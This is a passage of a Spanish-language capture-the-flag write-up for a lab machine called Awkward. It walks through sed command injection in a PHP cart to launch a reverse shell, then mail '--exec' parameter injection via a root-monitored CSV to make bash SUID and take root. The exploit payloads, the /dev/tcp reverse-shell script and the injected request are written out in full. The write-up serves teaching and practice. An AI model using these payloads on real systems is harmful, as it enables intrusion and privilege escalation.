+drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
+drwxrwxrwx 2 root root  4096 Feb 24 04:20 product-details
+-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
+-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
+-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css
+{% endhighlight %}
+
+Pero recordemos que este sitio está protegido por autenticación de tipo HTTP Basic y tenemos solamente dos credenciales; con ambas el sitio se sigue negando a darnos acceso.
+
+Al ser HTTP Basic debe haber algún .htpasswd en la máquina... si buscamos en los archivos de configuración de Nginx lo encontraremos:
+
+{% highlight bash %}
+bean@awkward:/etc/nginx/conf.d$ cat .htpasswd
+admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+{% endhighlight %}
+
+Intentando con el usuario admin y las contraseñas que conocemos; con la de Bean el sitio nos otorga acceso a lo que es la verdadera tienda de sombreros:
+
+![Shop](/assets/writeups/awkward/13.png)
+
+Aquí tenemos la ventaja de ver el código del aplicativo, asi que vamos a mirar...
+
+El archivo cart_actions.php nos dice bastante de como funciona la pagina; el carrito de compras del sitio se guarda en el directorio `/var/www/store/product-details/{id-usuario}.txt`, y siempre verifica que tenga el header `*** Hat Valey` antes de proseguir con las operaciones.
+
+Tiene verificaciones de carácteres raros, pero no verifica si hay guiones, backslashes o comillas (de nuevo).
+
+Lo siguiente es ejecutado para eliminar items del carrito:
+
+{% highlight php %}
+...
+}
+    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
+        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
+        echo "Item removed from cart";
+    }
+    else {
+        echo "Invalid item";
+    }
+    exit;
+...
+{% endhighlight %}
+
+Solamente elimina las lineas que coincidan con lo que haya en la variable $item_id, sería algo así:
+{% highlight bash %}
+❯ cat text
+vzon=cute
+suricata=ugly
+that is a fact, no matter what.
+❯ sed -i "/suricata=ugly/d" text
+❯ cat text
+vzon=cute
+that is a fact, no matter what.
+{% endhighlight %}
+
+sed tiene una opción especial llamada "e" que te permite ejecutar comandos
+
+{% highlight bash %}
+[line-number]e touch hello 
+{% endhighlight %}
+
+Si podemos introducir los tres caracteres mencionados anteriormente sin que el sitio se moleste, podríamos hacer algo como esto:
+
+{% highlight bash %}
+#Notese los carácteres
+❯ sed -i '/vzon=' -e '1e touch pwned' '/d' text
+sed: no se puede leer /vzon=: No existe el fichero o el directorio
+❯ ls -la pwned
+.rw-r--r-- 0 vzon 23 feb 14:18 pwned
+{% endhighlight %}
+
+Vamos a intentarlo agregendo un item al carrito, luego removiéndolo y editando la petición que se envia al servidor. Pero antes debemos crear un script que nos envíe una consola interactiva para ejecutar porque recordemos que estamos limitados en cuanto a caracteres en la petición
+
+Creemoslo en /tmp con el nombre "a.sh":
+
+{% highlight bash %}
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/127.0.0.1/8443 0>&1"
+{% endhighlight %}
+
+No hay que olvidar darle permisos de ejecución eh.
+
+Interceptando peticiones vemos esto por POST al remover un item del carrito:
+
+```
+item=2&user=da41-18a7-cb9-bcc4&action=delete_item
+```
+
+Lo cambiamos a:
+
+```
+item='+-e+'1e+/tmp/a.sh'+'&user=da41-18a7-cb9-bcc4&action=delete_item
+```
+
+Iniciamos un listener de netcat en el puerto 8443 de la misma máquina, déjamos fluir la petición editada... y recibimos la conexión con la reverse shell.
+
+{% highlight bash %}
+bean@awkward:~$ nc -lvnp 8443
+Listening on 0.0.0.0 8443
+Connection received on 127.0.0.1 38014
+bash: cannot set terminal process group (1409): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@awkward:~/store$ script /dev/null -c bash #Iniciar un nuevo proceso 
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@awkward:~/store$ ^Z #CTRL + Z
+[1]+  Stopped                 nc -lvnp 8443
+bean@awkward:~$ stty raw -echo; fg # Establecer ciertas opciones de la tty
+nc -lvnp 8443
+             reset xterm # Reiniciar la terminal
+www-data@awkward:~/store$ export TERM=xterm # Establecer el tipo de terminal
+www-data@awkward:~/store$ stty rows 37 columns 151 # Establecer filas y columnas
+{% endhighlight %}
+
+El archivo `leave_requests.csv` contiene lo siguiente:
+
+{% highlight csv %}
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+{% endhighlight %}
+
+Vamos a editarlo para ver que pasa; mientras edito dejaré el pspy64 corriendo en otra sesión ssh como bean.
+
+```
+echo "test" >> leave_requests.csv
+```
+
+Haciendo esto, vemos que ejecuta el comando mail... con el string que le concatenamos al final de `leave_requests.csv`:
+
+{% highlight bash %}
+2023/02/24 07:12:28 CMD: UID=0    PID=9016   | /bin/bash /root/scripts/notify.sh 
+2023/02/24 07:12:28 CMD: UID=0    PID=9020   | mail -s Leave Request: test christine 
+2023/02/24 07:12:28 CMD: UID=0    PID=9021   | /usr/sbin/sendmail -oi -f root@awkward -t 
+2023/02/24 07:12:28 CMD: UID=0    PID=9022   | /usr/sbin/postdrop -r 
+2023/02/24 07:12:28 CMD: UID=0    PID=9023   | cleanup -z -t unix -u -c 
+2023/02/24 07:12:28 CMD: UID=0    PID=9024   | trivial-rewrite -n rewrite -t unix -u -c 
+2023/02/24 07:12:28 CMD: UID=0    PID=9025   | local -t unix 
+{% endhighlight %}
+
+Veamos si podemos injectarle el parametro de mail `--exec` para decirle que nos ejecute el script que creamos antes.
+
+Podrías dejarle el mismo contenido y editarle la IP/puerto para que te envíe una consola como root pero yo haré que me convierta la Bash en un binario SUID
+
+{% highlight bash %}
+#!/bin/bash
+chmod u+s /bin/bash
+{% endhighlight %}
+
+Ahora metemos el parametro a inyectar y unos datos extra para seguir el formato del CSV al archivo
+
+{% highlight bash %}
+echo '" --exec="\!/tmp/a.sh",1,1,1,1' >> leave_requests.csv
+{% endhighlight %}
+
+y bang
+
+{% highlight bash %}
+bean@awkward:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Jan  7  2022 /bin/bash
+{% endhighlight %}
+
+Ahora tomemos la ultima flag
+
+{% highlight bash %}
+bean@awkward:~$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# cd /root
+bash-5.1# cat root.txt
+071328875a7a7dd6684b564*********
+bash-5.1# chmod u-s /bin/bash #Quitarle los privilegios SUID ya que puede generar alertas o problemas en el sistema. Nota que esto no te quitará la shell con privilegios que tienes a menos que la cierres
+{% endhighlight %}
+
+<h2>EXTRA</h2>
+
+Buscando en el proyecto npm del sitio principal para saber porqué sus assets estaban mal procesadas vi que para levantar el sitio usaban `vue-cli-service`
+
+{% highlight json %}
+{"file":"/var/www/hat-valley.htb/package.json"}
+...
+  "scripts": {
+    "serve": "./node_modules/@vue/cli-service/bin/vue-cli-service.js serve",
+    "build": "vue-cli-service build",
+    "lint": "vue-cli-service lint",
+    "server": "nodemon server/server.js"
+  }
+...
+{% endhighlight %}
+
+Quiero pensar que el app.js estaba mal procesado ya que el servidor que levantas con eso está hecho para desarrollo y no para producción... y bueno.
+
+Este era el script `notify.sh` que ejecutaba root
+
+{% highlight bash %}
+root@awkward:~/scripts# cat notify.sh
+#!/bin/bash
+
+inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv | while read; do
+	change=$(tail -1 /var/www/private/leave_requests.csv)
+	name=`echo $change | awk -F, '{print $1}'`
+	echo -e "You have a new leave request to review!\n$change" | mail -s "Leave Request: "$name christine
+done
+{% endhighlight %}
+
+La inyección de parametros ocurre ya que al ponerle la comilla lo que le sigue es tratado como un espacio en blanco y un parametro del comando:
+
+{% highlight bash %}
+root@awkward:~/scripts# echo "test" | mail -s "test: "\" --exec='\!touch pwned' christine 
+root@awkward:~/scripts# ls
+express.sh  notify.sh  pwned  restore.sh  vue.sh
+root@awkward:~/scripts# cat /var/mail/christine
+...
+# El correo se envia igual
+From root@awkward  Fri Feb 24 12:57:00 2023
+Return-Path: <root@awkward>
+X-Original-To: christine
+Delivered-To: christine@awkward.localdomain
+Received: by awkward.localdomain (Postfix, from userid 0)
+	id 7208D19025; Fri, 24 Feb 2023 12:57:00 +1100 (AEDT)
+Subject: test: "
+To: christine@awkward.localdomain
+User-Agent: mail (GNU Mailutils 3.14)
+Date: Fri, 24 Feb 2023 12:57:00 +1100
+Message-Id: <20230224015700.7208D19025@awkward.localdomain>
+From: root <root@awkward>
+
+test
+
+{% endhighlight %}
